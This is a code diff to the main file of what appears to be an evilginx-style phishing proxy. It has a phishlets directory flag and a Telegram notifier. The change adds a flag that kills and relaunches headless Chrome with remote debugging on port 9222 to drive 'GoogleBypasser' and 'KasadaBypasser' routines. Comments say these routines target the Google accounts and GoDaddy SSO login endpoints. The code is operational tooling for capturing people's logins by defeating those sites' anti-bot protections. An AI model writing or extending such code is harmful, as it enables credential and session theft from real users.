@@ -1,10 +1,12 @@
 package main
 
 import (
+	"bytes" // For bytes.Buffer
 	"flag"
 	"fmt"
 	_log "log"
 	"os"
+	"os/exec" // For exec.Command
 	"os/user"
 	"path/filepath"
 	"regexp"
@@ -17,6 +19,7 @@ import (
 	"go.uber.org/zap"
 
 	"github.com/fatih/color"
+	"github.com/go-rod/rod/lib/launcher" // Replace with actual import path if launcher is a package
 )
 
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
@@ -48,17 +51,52 @@ func showAd() {
 	log.Info("%s", message)
 }
 
-// NOTE: Google and GoDaddy bypasses are ALWAYS ACTIVE when Chrome is running on port 9222
-// Chrome is started automatically by start.sh (start_chrome_headless function)
-// No flags needed - the bypass code in http_proxy.go triggers automatically based on URL patterns
+var google_bypass = flag.Bool("google-bypass", false, "Enable Google Bypass")
 
 func init() {
 	flag.Parse()
-	// Chrome headless is now started by start.sh script (start_chrome_headless function)
-	// This ensures Chrome is available for both GoogleBypasser and KasadaBypasser
-	// The bypass code in http_proxy.go will automatically trigger when:
-	// - GoogleBypasser: accounts.google.com + specific batchexecute URL
-	// - KasadaBypasser: sso.godaddy.com + /v1/api/pass/login
+	if *google_bypass {
+		// Ensure the DISPLAY environment variable is set
+		display := ":99"
+		if disp := getenv("DISPLAY", ""); disp != "" {
+			display = disp
+		}
+
+		// Kill any existing Chrome instances with remote debugging on port 9222
+		exec.Command("pkill", "-f", "google-chrome.*--remote-debugging-port=9222").Run()
+		log.Debug("Killed all google-chrome instances running in debug mode on port 9222")
+
+		// Start google-chrome in debug mode
+		cmd := exec.Command("google-chrome", "--remote-debugging-port=9222", "--no-sandbox")
+
+		// Capture standard output and error
+		var out bytes.Buffer
+		var stderr bytes.Buffer
+		cmd.Stdout = &out
+		cmd.Stderr = &stderr
+
+		// Set environment variables if necessary (e.g., DISPLAY)
+		cmd.Env = append(cmd.Env, fmt.Sprintf("DISPLAY=%s", display))
+
+		err := cmd.Start()
+		if err != nil {
+			log.Error("Failed to start google-chrome in debug mode: %v", err)
+			log.Error("Command output: %s", stderr.String())
+			return
+		}
+		log.Debug("Started google-chrome in debug mode on port 9222")
+
+		// Optionally wait for the command to finish and capture its output
+		go func() {
+			err = cmd.Wait()
+			if err != nil {
+				log.Error("google-chrome process exited with error: %v", err)
+				log.Error("Command output: %s", stderr.String())
+			}
+		}()
+		// Ensure a browser instance is available
+		launcher.NewBrowser().MustGet() // Ensure this function exists in the launcher package
+	}
 }
 
 func getenv(key, fallback string) string {
@@ -203,14 +241,6 @@ func main() {
 	// Initialize telegram notifier
 	telegram := core.NewTelegramNotifier(cfg.GetTelegramConfig(), db)
 	_ = telegram // Used by EvilFeed integration
-
-	// Pre-warm Chrome for GoogleBypasser (prevents first-request failure)
-	// This runs in a goroutine so it doesn't block startup
-	go func() {
-		if err := core.PreWarmChrome(); err != nil {
-			log.Warning("Chrome pre-warm failed: %v (GoogleBypasser may fail on first request)", err)
-		}
-	}()
 
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 
